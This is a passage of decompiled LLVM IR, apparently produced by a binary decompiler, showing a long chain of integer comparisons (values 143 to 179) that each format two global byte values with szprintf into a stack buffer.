dec_label_pc_c8d8:                                ; preds = %dec_label_pc_c8a4, %dec_label_pc_c8b0
  %v7_c8dc = icmp eq i32 %v2_a95c, 143
  br i1 %v7_c8dc, label %dec_label_pc_c8e4, label %dec_label_pc_c90c

dec_label_pc_c8e4:                                ; preds = %dec_label_pc_c8d8
  %v2_c8e4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c8f0 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c8fc = load i8, i8* @global_var_324e2.76, align 1
  %v4_c908 = sext i8 %v3_c8f0 to i32
  %v6_c908 = sext i8 %v3_c8fc to i32
  %v8_c908 = call i32 @szprintf(i32 %v2_c8e4, i32 ptrtoint ([14 x i8]* @global_var_241bc.319 to i32), i32 %v4_c908, i32 %v6_c908, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c90c

dec_label_pc_c90c:                                ; preds = %dec_label_pc_c8d8, %dec_label_pc_c8e4
  %v7_c910 = icmp eq i32 %v2_a95c, 144
  br i1 %v7_c910, label %dec_label_pc_c918, label %dec_label_pc_c940

dec_label_pc_c918:                                ; preds = %dec_label_pc_c90c
  %v2_c918 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c924 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c930 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c93c = sext i8 %v3_c924 to i32
  %v6_c93c = sext i8 %v3_c930 to i32
  %v8_c93c = call i32 @szprintf(i32 %v2_c918, i32 ptrtoint ([14 x i8]* @global_var_242dc.355 to i32), i32 %v4_c93c, i32 %v6_c93c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c940

dec_label_pc_c940:                                ; preds = %dec_label_pc_c90c, %dec_label_pc_c918
  %v7_c944 = icmp eq i32 %v2_a95c, 145
  br i1 %v7_c944, label %dec_label_pc_c94c, label %dec_label_pc_c974

dec_label_pc_c94c:                                ; preds = %dec_label_pc_c940
  %v2_c94c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c958 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c964 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c970 = sext i8 %v3_c958 to i32
  %v6_c970 = sext i8 %v3_c964 to i32
  %v8_c970 = call i32 @szprintf(i32 %v2_c94c, i32 ptrtoint ([14 x i8]* @global_var_242ec.357 to i32), i32 %v4_c970, i32 %v6_c970, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c974

dec_label_pc_c974:                                ; preds = %dec_label_pc_c940, %dec_label_pc_c94c
  %v7_c978 = icmp eq i32 %v2_a95c, 146
  br i1 %v7_c978, label %dec_label_pc_c980, label %dec_label_pc_c9a8

dec_label_pc_c980:                                ; preds = %dec_label_pc_c974
  %v2_c980 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c98c = load i8, i8* @global_var_324e1.75, align 1
  %v3_c998 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c9a4 = sext i8 %v3_c98c to i32
  %v6_c9a4 = sext i8 %v3_c998 to i32
  %v8_c9a4 = call i32 @szprintf(i32 %v2_c980, i32 ptrtoint ([14 x i8]* @global_var_242fc.359 to i32), i32 %v4_c9a4, i32 %v6_c9a4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c9a8

dec_label_pc_c9a8:                                ; preds = %dec_label_pc_c974, %dec_label_pc_c980
  %v7_c9ac = icmp eq i32 %v2_a95c, 147
  br i1 %v7_c9ac, label %dec_label_pc_c9b4, label %dec_label_pc_c9dc

dec_label_pc_c9b4:                                ; preds = %dec_label_pc_c9a8
  %v2_c9b4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c9c0 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c9cc = load i8, i8* @global_var_324e2.76, align 1
  %v4_c9d8 = sext i8 %v3_c9c0 to i32
  %v6_c9d8 = sext i8 %v3_c9cc to i32
  %v8_c9d8 = call i32 @szprintf(i32 %v2_c9b4, i32 ptrtoint ([13 x i8]* @global_var_2430c.361 to i32), i32 %v4_c9d8, i32 %v6_c9d8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c9dc

dec_label_pc_c9dc:                                ; preds = %dec_label_pc_c9a8, %dec_label_pc_c9b4
  %v7_c9e0 = icmp eq i32 %v2_a95c, 148
  br i1 %v7_c9e0, label %dec_label_pc_c9e8, label %dec_label_pc_ca10

dec_label_pc_c9e8:                                ; preds = %dec_label_pc_c9dc
  %v2_c9e8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c9f4 = load i8, i8* @global_var_324e1.75, align 1
  %v3_ca00 = load i8, i8* @global_var_324e2.76, align 1
  %v4_ca0c = sext i8 %v3_c9f4 to i32
  %v6_ca0c = sext i8 %v3_ca00 to i32
  %v8_ca0c = call i32 @szprintf(i32 %v2_c9e8, i32 ptrtoint ([13 x i8]* @global_var_2431c.363 to i32), i32 %v4_ca0c, i32 %v6_ca0c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ca10

dec_label_pc_ca10:                                ; preds = %dec_label_pc_c9dc, %dec_label_pc_c9e8
  %v7_ca14 = icmp eq i32 %v2_a95c, 149
  br i1 %v7_ca14, label %dec_label_pc_ca1c, label %dec_label_pc_ca44

dec_label_pc_ca1c:                                ; preds = %dec_label_pc_ca10
  %v2_ca1c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ca28 = load i8, i8* @global_var_324e1.75, align 1
  %v3_ca34 = load i8, i8* @global_var_324e2.76, align 1
  %v4_ca40 = sext i8 %v3_ca28 to i32
  %v6_ca40 = sext i8 %v3_ca34 to i32
  %v8_ca40 = call i32 @szprintf(i32 %v2_ca1c, i32 ptrtoint ([14 x i8]* @global_var_2432c.366 to i32), i32 %v4_ca40, i32 %v6_ca40, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ca44

dec_label_pc_ca44:                                ; preds = %dec_label_pc_ca10, %dec_label_pc_ca1c
  %v7_ca48 = icmp eq i32 %v2_a95c, 150
  br i1 %v7_ca48, label %dec_label_pc_ca50, label %dec_label_pc_ca78

dec_label_pc_ca50:                                ; preds = %dec_label_pc_ca44
  %v2_ca50 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ca5c = load i8, i8* @global_var_324e1.75, align 1
  %v3_ca68 = load i8, i8* @global_var_324e2.76, align 1
  %v4_ca74 = sext i8 %v3_ca5c to i32
  %v6_ca74 = sext i8 %v3_ca68 to i32
  %v8_ca74 = call i32 @szprintf(i32 %v2_ca50, i32 ptrtoint ([14 x i8]* @global_var_2433c.368 to i32), i32 %v4_ca74, i32 %v6_ca74, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ca78

dec_label_pc_ca78:                                ; preds = %dec_label_pc_ca44, %dec_label_pc_ca50
  %v7_ca7c = icmp eq i32 %v2_a95c, 151
  br i1 %v7_ca7c, label %dec_label_pc_ca84, label %dec_label_pc_caac

dec_label_pc_ca84:                                ; preds = %dec_label_pc_ca78
  %v2_ca84 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ca90 = load i8, i8* @global_var_324e1.75, align 1
  %v3_ca9c = load i8, i8* @global_var_324e2.76, align 1
  %v4_caa8 = sext i8 %v3_ca90 to i32
  %v6_caa8 = sext i8 %v3_ca9c to i32
  %v8_caa8 = call i32 @szprintf(i32 %v2_ca84, i32 ptrtoint ([14 x i8]* @global_var_2434c.370 to i32), i32 %v4_caa8, i32 %v6_caa8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_caac

dec_label_pc_caac:                                ; preds = %dec_label_pc_ca78, %dec_label_pc_ca84
  %v7_cab0 = icmp eq i32 %v2_a95c, 152
  br i1 %v7_cab0, label %dec_label_pc_cab8, label %dec_label_pc_cae0

dec_label_pc_cab8:                                ; preds = %dec_label_pc_caac
  %v2_cab8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cac4 = load i8, i8* @global_var_324e1.75, align 1
  %v3_cad0 = load i8, i8* @global_var_324e2.76, align 1
  %v4_cadc = sext i8 %v3_cac4 to i32
  %v6_cadc = sext i8 %v3_cad0 to i32
  %v8_cadc = call i32 @szprintf(i32 %v2_cab8, i32 ptrtoint ([14 x i8]* @global_var_24130.301 to i32), i32 %v4_cadc, i32 %v6_cadc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cae0

dec_label_pc_cae0:                                ; preds = %dec_label_pc_caac, %dec_label_pc_cab8
  %v7_cae4 = icmp eq i32 %v2_a95c, 153
  br i1 %v7_cae4, label %dec_label_pc_caec, label %dec_label_pc_cb14

dec_label_pc_caec:                                ; preds = %dec_label_pc_cae0
  %v2_caec = ptrtoint i32* %stack_var_-36 to i32
  %v3_caf8 = load i8, i8* @global_var_324e1.75, align 1
  %v3_cb04 = load i8, i8* @global_var_324e2.76, align 1
  %v4_cb10 = sext i8 %v3_caf8 to i32
  %v6_cb10 = sext i8 %v3_cb04 to i32
  %v8_cb10 = call i32 @szprintf(i32 %v2_caec, i32 ptrtoint ([13 x i8]* @global_var_2435c.373 to i32), i32 %v4_cb10, i32 %v6_cb10, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cb14

dec_label_pc_cb14:                                ; preds = %dec_label_pc_cae0, %dec_label_pc_caec
  %v7_cb18 = icmp eq i32 %v2_a95c, 154
  br i1 %v7_cb18, label %dec_label_pc_cb20, label %dec_label_pc_cb48

dec_label_pc_cb20:                                ; preds = %dec_label_pc_cb14
  %v2_cb20 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cb2c = load i8, i8* @global_var_324e1.75, align 1
  %v3_cb38 = load i8, i8* @global_var_324e2.76, align 1
  %v4_cb44 = sext i8 %v3_cb2c to i32
  %v6_cb44 = sext i8 %v3_cb38 to i32
  %v8_cb44 = call i32 @szprintf(i32 %v2_cb20, i32 ptrtoint ([13 x i8]* @global_var_2436c.375 to i32), i32 %v4_cb44, i32 %v6_cb44, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cb48

dec_label_pc_cb48:                                ; preds = %dec_label_pc_cb14, %dec_label_pc_cb20
  %v7_cb4c = icmp eq i32 %v2_a95c, 155
  br i1 %v7_cb4c, label %dec_label_pc_cb54, label %dec_label_pc_cb7c

dec_label_pc_cb54:                                ; preds = %dec_label_pc_cb48
  %v2_cb54 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cb60 = load i8, i8* @global_var_324e1.75, align 1
  %v3_cb6c = load i8, i8* @global_var_324e2.76, align 1
  %v4_cb78 = sext i8 %v3_cb60 to i32
  %v6_cb78 = sext i8 %v3_cb6c to i32
  %v8_cb78 = call i32 @szprintf(i32 %v2_cb54, i32 ptrtoint ([13 x i8]* @global_var_2437c.377 to i32), i32 %v4_cb78, i32 %v6_cb78, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cb7c

dec_label_pc_cb7c:                                ; preds = %dec_label_pc_cb48, %dec_label_pc_cb54
  %v7_cb80 = icmp eq i32 %v2_a95c, 156
  br i1 %v7_cb80, label %dec_label_pc_cb88, label %dec_label_pc_cbb0

dec_label_pc_cb88:                                ; preds = %dec_label_pc_cb7c
  %v2_cb88 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cb94 = load i8, i8* @global_var_324e1.75, align 1
  %v3_cba0 = load i8, i8* @global_var_324e2.76, align 1
  %v4_cbac = sext i8 %v3_cb94 to i32
  %v6_cbac = sext i8 %v3_cba0 to i32
  %v8_cbac = call i32 @szprintf(i32 %v2_cb88, i32 ptrtoint ([13 x i8]* @global_var_2438c.379 to i32), i32 %v4_cbac, i32 %v6_cbac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cbb0

dec_label_pc_cbb0:                                ; preds = %dec_label_pc_cb7c, %dec_label_pc_cb88
  %v7_cbb4 = icmp eq i32 %v2_a95c, 157
  br i1 %v7_cbb4, label %dec_label_pc_cbbc, label %dec_label_pc_cbe4

dec_label_pc_cbbc:                                ; preds = %dec_label_pc_cbb0
  %v2_cbbc = ptrtoint i32* %stack_var_-36 to i32
  %v3_cbc8 = load i8, i8* @global_var_324e1.75, align 1
  %v3_cbd4 = load i8, i8* @global_var_324e2.76, align 1
  %v4_cbe0 = sext i8 %v3_cbc8 to i32
  %v6_cbe0 = sext i8 %v3_cbd4 to i32
  %v8_cbe0 = call i32 @szprintf(i32 %v2_cbbc, i32 ptrtoint ([13 x i8]* @global_var_2439c.381 to i32), i32 %v4_cbe0, i32 %v6_cbe0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cbe4

dec_label_pc_cbe4:                                ; preds = %dec_label_pc_cbb0, %dec_label_pc_cbbc
  %v7_cbe8 = icmp eq i32 %v2_a95c, 158
  br i1 %v7_cbe8, label %dec_label_pc_cbf0, label %dec_label_pc_cc18

dec_label_pc_cbf0:                                ; preds = %dec_label_pc_cbe4
  %v2_cbf0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cbfc = load i8, i8* @global_var_324e1.75, align 1
  %v3_cc08 = load i8, i8* @global_var_324e2.76, align 1
  %v4_cc14 = sext i8 %v3_cbfc to i32
  %v6_cc14 = sext i8 %v3_cc08 to i32
  %v8_cc14 = call i32 @szprintf(i32 %v2_cbf0, i32 ptrtoint ([12 x i8]* @global_var_243ac.383 to i32), i32 %v4_cc14, i32 %v6_cc14, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cc18

dec_label_pc_cc18:                                ; preds = %dec_label_pc_cbe4, %dec_label_pc_cbf0
  %v7_cc1c = icmp eq i32 %v2_a95c, 159
  br i1 %v7_cc1c, label %dec_label_pc_cc24, label %dec_label_pc_cc4c

dec_label_pc_cc24:                                ; preds = %dec_label_pc_cc18
  %v2_cc24 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cc30 = load i8, i8* @global_var_324e1.75, align 1
  %v3_cc3c = load i8, i8* @global_var_324e2.76, align 1
  %v4_cc48 = sext i8 %v3_cc30 to i32
  %v6_cc48 = sext i8 %v3_cc3c to i32
  %v8_cc48 = call i32 @szprintf(i32 %v2_cc24, i32 ptrtoint ([14 x i8]* @global_var_243b8.385 to i32), i32 %v4_cc48, i32 %v6_cc48, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cc4c

dec_label_pc_cc4c:                                ; preds = %dec_label_pc_cc18, %dec_label_pc_cc24
  %v7_cc50 = icmp eq i32 %v2_a95c, 160
  br i1 %v7_cc50, label %dec_label_pc_cc58, label %dec_label_pc_cc80

dec_label_pc_cc58:                                ; preds = %dec_label_pc_cc4c
  %v2_cc58 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cc64 = load i8, i8* @global_var_324e1.75, align 1
  %v3_cc70 = load i8, i8* @global_var_324e2.76, align 1
  %v4_cc7c = sext i8 %v3_cc64 to i32
  %v6_cc7c = sext i8 %v3_cc70 to i32
  %v8_cc7c = call i32 @szprintf(i32 %v2_cc58, i32 ptrtoint ([13 x i8]* @global_var_243c8.387 to i32), i32 %v4_cc7c, i32 %v6_cc7c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cc80

dec_label_pc_cc80:                                ; preds = %dec_label_pc_cc4c, %dec_label_pc_cc58
  %v7_cc84 = icmp eq i32 %v2_a95c, 161
  br i1 %v7_cc84, label %dec_label_pc_cc8c, label %dec_label_pc_ccb4

dec_label_pc_cc8c:                                ; preds = %dec_label_pc_cc80
  %v2_cc8c = ptrtoint i32* %stack_var_-36 to i32
  %v3_cc98 = load i8, i8* @global_var_324e1.75, align 1
  %v3_cca4 = load i8, i8* @global_var_324e2.76, align 1
  %v4_ccb0 = sext i8 %v3_cc98 to i32
  %v6_ccb0 = sext i8 %v3_cca4 to i32
  %v8_ccb0 = call i32 @szprintf(i32 %v2_cc8c, i32 ptrtoint ([14 x i8]* @global_var_243d8.389 to i32), i32 %v4_ccb0, i32 %v6_ccb0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ccb4

dec_label_pc_ccb4:                                ; preds = %dec_label_pc_cc80, %dec_label_pc_cc8c
  %v7_ccb8 = icmp eq i32 %v2_a95c, 162
  br i1 %v7_ccb8, label %dec_label_pc_ccc0, label %dec_label_pc_cce8

dec_label_pc_ccc0:                                ; preds = %dec_label_pc_ccb4
  %v2_ccc0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cccc = load i8, i8* @global_var_324e1.75, align 1
  %v3_ccd8 = load i8, i8* @global_var_324e2.76, align 1
  %v4_cce4 = sext i8 %v3_cccc to i32
  %v6_cce4 = sext i8 %v3_ccd8 to i32
  %v8_cce4 = call i32 @szprintf(i32 %v2_ccc0, i32 ptrtoint ([14 x i8]* @global_var_243e8.391 to i32), i32 %v4_cce4, i32 %v6_cce4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cce8

dec_label_pc_cce8:                                ; preds = %dec_label_pc_ccb4, %dec_label_pc_ccc0
  %v7_ccec = icmp eq i32 %v2_a95c, 163
  br i1 %v7_ccec, label %dec_label_pc_ccf4, label %dec_label_pc_cd1c

dec_label_pc_ccf4:                                ; preds = %dec_label_pc_cce8
  %v2_ccf4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cd00 = load i8, i8* @global_var_324e1.75, align 1
  %v3_cd0c = load i8, i8* @global_var_324e2.76, align 1
  %v4_cd18 = sext i8 %v3_cd00 to i32
  %v6_cd18 = sext i8 %v3_cd0c to i32
  %v8_cd18 = call i32 @szprintf(i32 %v2_ccf4, i32 ptrtoint ([14 x i8]* @global_var_243f8.393 to i32), i32 %v4_cd18, i32 %v6_cd18, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cd1c

dec_label_pc_cd1c:                                ; preds = %dec_label_pc_cce8, %dec_label_pc_ccf4
  %v7_cd20 = icmp eq i32 %v2_a95c, 164
  br i1 %v7_cd20, label %dec_label_pc_cd28, label %dec_label_pc_cd50

dec_label_pc_cd28:                                ; preds = %dec_label_pc_cd1c
  %v2_cd28 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cd34 = load i8, i8* @global_var_324e1.75, align 1
  %v3_cd40 = load i8, i8* @global_var_324e2.76, align 1
  %v4_cd4c = sext i8 %v3_cd34 to i32
  %v6_cd4c = sext i8 %v3_cd40 to i32
  %v8_cd4c = call i32 @szprintf(i32 %v2_cd28, i32 ptrtoint ([14 x i8]* @global_var_2434c.370 to i32), i32 %v4_cd4c, i32 %v6_cd4c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cd50

dec_label_pc_cd50:                                ; preds = %dec_label_pc_cd1c, %dec_label_pc_cd28
  %v7_cd54 = icmp eq i32 %v2_a95c, 165
  br i1 %v7_cd54, label %dec_label_pc_cd5c, label %dec_label_pc_cd84

dec_label_pc_cd5c:                                ; preds = %dec_label_pc_cd50
  %v2_cd5c = ptrtoint i32* %stack_var_-36 to i32
  %v3_cd68 = load i8, i8* @global_var_324e1.75, align 1
  %v3_cd74 = load i8, i8* @global_var_324e2.76, align 1
  %v4_cd80 = sext i8 %v3_cd68 to i32
  %v6_cd80 = sext i8 %v3_cd74 to i32
  %v8_cd80 = call i32 @szprintf(i32 %v2_cd5c, i32 ptrtoint ([13 x i8]* @global_var_24408.395 to i32), i32 %v4_cd80, i32 %v6_cd80, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cd84

dec_label_pc_cd84:                                ; preds = %dec_label_pc_cd50, %dec_label_pc_cd5c
  %v7_cd88 = icmp eq i32 %v2_a95c, 166
  br i1 %v7_cd88, label %dec_label_pc_cd90, label %dec_label_pc_cdb8

dec_label_pc_cd90:                                ; preds = %dec_label_pc_cd84
  %v2_cd90 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cd9c = load i8, i8* @global_var_324e1.75, align 1
  %v3_cda8 = load i8, i8* @global_var_324e2.76, align 1
  %v4_cdb4 = sext i8 %v3_cd9c to i32
  %v6_cdb4 = sext i8 %v3_cda8 to i32
  %v8_cdb4 = call i32 @szprintf(i32 %v2_cd90, i32 ptrtoint ([14 x i8]* @global_var_24418.397 to i32), i32 %v4_cdb4, i32 %v6_cdb4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cdb8

dec_label_pc_cdb8:                                ; preds = %dec_label_pc_cd84, %dec_label_pc_cd90
  %v7_cdbc = icmp eq i32 %v2_a95c, 167
  br i1 %v7_cdbc, label %dec_label_pc_cdc4, label %dec_label_pc_cdec

dec_label_pc_cdc4:                                ; preds = %dec_label_pc_cdb8
  %v2_cdc4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cdd0 = load i8, i8* @global_var_324e1.75, align 1
  %v3_cddc = load i8, i8* @global_var_324e2.76, align 1
  %v4_cde8 = sext i8 %v3_cdd0 to i32
  %v6_cde8 = sext i8 %v3_cddc to i32
  %v8_cde8 = call i32 @szprintf(i32 %v2_cdc4, i32 ptrtoint ([14 x i8]* @global_var_243b8.385 to i32), i32 %v4_cde8, i32 %v6_cde8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cdec

dec_label_pc_cdec:                                ; preds = %dec_label_pc_cdb8, %dec_label_pc_cdc4
  %v7_cdf0 = icmp eq i32 %v2_a95c, 168
  br i1 %v7_cdf0, label %dec_label_pc_cdf8, label %dec_label_pc_ce20

dec_label_pc_cdf8:                                ; preds = %dec_label_pc_cdec
  %v2_cdf8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ce04 = load i8, i8* @global_var_324e1.75, align 1
  %v3_ce10 = load i8, i8* @global_var_324e2.76, align 1
  %v4_ce1c = sext i8 %v3_ce04 to i32
  %v6_ce1c = sext i8 %v3_ce10 to i32
  %v8_ce1c = call i32 @szprintf(i32 %v2_cdf8, i32 ptrtoint ([14 x i8]* @global_var_24428.399 to i32), i32 %v4_ce1c, i32 %v6_ce1c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ce20

dec_label_pc_ce20:                                ; preds = %dec_label_pc_cdec, %dec_label_pc_cdf8
  %v7_ce24 = icmp eq i32 %v2_a95c, 169
  br i1 %v7_ce24, label %dec_label_pc_ce2c, label %dec_label_pc_ce54

dec_label_pc_ce2c:                                ; preds = %dec_label_pc_ce20
  %v2_ce2c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ce38 = load i8, i8* @global_var_324e1.75, align 1
  %v3_ce44 = load i8, i8* @global_var_324e2.76, align 1
  %v4_ce50 = sext i8 %v3_ce38 to i32
  %v6_ce50 = sext i8 %v3_ce44 to i32
  %v8_ce50 = call i32 @szprintf(i32 %v2_ce2c, i32 ptrtoint ([14 x i8]* @global_var_24438.401 to i32), i32 %v4_ce50, i32 %v6_ce50, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ce54

dec_label_pc_ce54:                                ; preds = %dec_label_pc_ce20, %dec_label_pc_ce2c
  %v7_ce58 = icmp eq i32 %v2_a95c, 171
  br i1 %v7_ce58, label %dec_label_pc_ce60, label %dec_label_pc_ce88

dec_label_pc_ce60:                                ; preds = %dec_label_pc_ce54
  %v2_ce60 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ce6c = load i8, i8* @global_var_324e1.75, align 1
  %v3_ce78 = load i8, i8* @global_var_324e2.76, align 1
  %v4_ce84 = sext i8 %v3_ce6c to i32
  %v6_ce84 = sext i8 %v3_ce78 to i32
  %v8_ce84 = call i32 @szprintf(i32 %v2_ce60, i32 ptrtoint ([14 x i8]* @global_var_24448.403 to i32), i32 %v4_ce84, i32 %v6_ce84, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ce88

dec_label_pc_ce88:                                ; preds = %dec_label_pc_ce54, %dec_label_pc_ce60
  %v7_ce8c = icmp eq i32 %v2_a95c, 172
  br i1 %v7_ce8c, label %dec_label_pc_ce94, label %dec_label_pc_cebc

dec_label_pc_ce94:                                ; preds = %dec_label_pc_ce88
  %v2_ce94 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cea0 = load i8, i8* @global_var_324e1.75, align 1
  %v3_ceac = load i8, i8* @global_var_324e2.76, align 1
  %v4_ceb8 = sext i8 %v3_cea0 to i32
  %v6_ceb8 = sext i8 %v3_ceac to i32
  %v8_ceb8 = call i32 @szprintf(i32 %v2_ce94, i32 ptrtoint ([14 x i8]* @global_var_24458.405 to i32), i32 %v4_ceb8, i32 %v6_ceb8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cebc

dec_label_pc_cebc:                                ; preds = %dec_label_pc_ce88, %dec_label_pc_ce94
  %v7_cec0 = icmp eq i32 %v2_a95c, 173
  br i1 %v7_cec0, label %dec_label_pc_cec8, label %dec_label_pc_cef0

dec_label_pc_cec8:                                ; preds = %dec_label_pc_cebc
  %v2_cec8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ced4 = load i8, i8* @global_var_324e1.75, align 1
  %v3_cee0 = load i8, i8* @global_var_324e2.76, align 1
  %v4_ceec = sext i8 %v3_ced4 to i32
  %v6_ceec = sext i8 %v3_cee0 to i32
  %v8_ceec = call i32 @szprintf(i32 %v2_cec8, i32 ptrtoint ([14 x i8]* @global_var_24468.407 to i32), i32 %v4_ceec, i32 %v6_ceec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cef0

dec_label_pc_cef0:                                ; preds = %dec_label_pc_cebc, %dec_label_pc_cec8
  %v7_cef4 = icmp eq i32 %v2_a95c, 174
  br i1 %v7_cef4, label %dec_label_pc_cefc, label %dec_label_pc_cf24

dec_label_pc_cefc:                                ; preds = %dec_label_pc_cef0
  %v2_cefc = ptrtoint i32* %stack_var_-36 to i32
  %v3_cf08 = load i8, i8* @global_var_324e1.75, align 1
  %v3_cf14 = load i8, i8* @global_var_324e2.76, align 1
  %v4_cf20 = sext i8 %v3_cf08 to i32
  %v6_cf20 = sext i8 %v3_cf14 to i32
  %v8_cf20 = call i32 @szprintf(i32 %v2_cefc, i32 ptrtoint ([13 x i8]* @global_var_24478.409 to i32), i32 %v4_cf20, i32 %v6_cf20, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cf24

dec_label_pc_cf24:                                ; preds = %dec_label_pc_cef0, %dec_label_pc_cefc
  %v7_cf28 = icmp eq i32 %v2_a95c, 175
  br i1 %v7_cf28, label %dec_label_pc_cf30, label %dec_label_pc_cf58

dec_label_pc_cf30:                                ; preds = %dec_label_pc_cf24
  %v2_cf30 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cf3c = load i8, i8* @global_var_324e1.75, align 1
  %v3_cf48 = load i8, i8* @global_var_324e2.76, align 1
  %v4_cf54 = sext i8 %v3_cf3c to i32
  %v6_cf54 = sext i8 %v3_cf48 to i32
  %v8_cf54 = call i32 @szprintf(i32 %v2_cf30, i32 ptrtoint ([14 x i8]* @global_var_24488.411 to i32), i32 %v4_cf54, i32 %v6_cf54, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cf58

dec_label_pc_cf58:                                ; preds = %dec_label_pc_cf24, %dec_label_pc_cf30
  %v7_cf5c = icmp eq i32 %v2_a95c, 176
  br i1 %v7_cf5c, label %dec_label_pc_cf64, label %dec_label_pc_cf8c

dec_label_pc_cf64:                                ; preds = %dec_label_pc_cf58
  %v2_cf64 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cf70 = load i8, i8* @global_var_324e1.75, align 1
  %v3_cf7c = load i8, i8* @global_var_324e2.76, align 1
  %v4_cf88 = sext i8 %v3_cf70 to i32
  %v6_cf88 = sext i8 %v3_cf7c to i32
  %v8_cf88 = call i32 @szprintf(i32 %v2_cf64, i32 ptrtoint ([14 x i8]* @global_var_24498.413 to i32), i32 %v4_cf88, i32 %v6_cf88, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cf8c

dec_label_pc_cf8c:                                ; preds = %dec_label_pc_cf58, %dec_label_pc_cf64
  %v7_cf90 = icmp eq i32 %v2_a95c, 177
  br i1 %v7_cf90, label %dec_label_pc_cf98, label %dec_label_pc_cfc0

dec_label_pc_cf98:                                ; preds = %dec_label_pc_cf8c
  %v2_cf98 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cfa4 = load i8, i8* @global_var_324e1.75, align 1
  %v3_cfb0 = load i8, i8* @global_var_324e2.76, align 1
  %v4_cfbc = sext i8 %v3_cfa4 to i32
  %v6_cfbc = sext i8 %v3_cfb0 to i32
  %v8_cfbc = call i32 @szprintf(i32 %v2_cf98, i32 ptrtoint ([14 x i8]* @global_var_244a8.415 to i32), i32 %v4_cfbc, i32 %v6_cfbc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cfc0

dec_label_pc_cfc0:                                ; preds = %dec_label_pc_cf8c, %dec_label_pc_cf98
  %v7_cfc4 = icmp eq i32 %v2_a95c, 178
  br i1 %v7_cfc4, label %dec_label_pc_cfcc, label %dec_label_pc_cff4

dec_label_pc_cfcc:                                ; preds = %dec_label_pc_cfc0
  %v2_cfcc = ptrtoint i32* %stack_var_-36 to i32
  %v3_cfd8 = load i8, i8* @global_var_324e1.75, align 1
  %v3_cfe4 = load i8, i8* @global_var_324e2.76, align 1
  %v4_cff0 = sext i8 %v3_cfd8 to i32
  %v6_cff0 = sext i8 %v3_cfe4 to i32
  %v8_cff0 = call i32 @szprintf(i32 %v2_cfcc, i32 ptrtoint ([13 x i8]* @global_var_244b8.417 to i32), i32 %v4_cff0, i32 %v6_cff0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cff4

dec_label_pc_cff4:                                ; preds = %dec_label_pc_cfc0, %dec_label_pc_cfcc
  %v7_cff8 = icmp eq i32 %v2_a95c, 179
  br i1 %v7_cff8, label %dec_label_pc_d000, label %dec_label_pc_d028

dec_label_pc_d000:                                ; preds = %dec_label_pc_cff4
  %v2_d000 = ptrtoint i32* %stack_var_-36 to i32
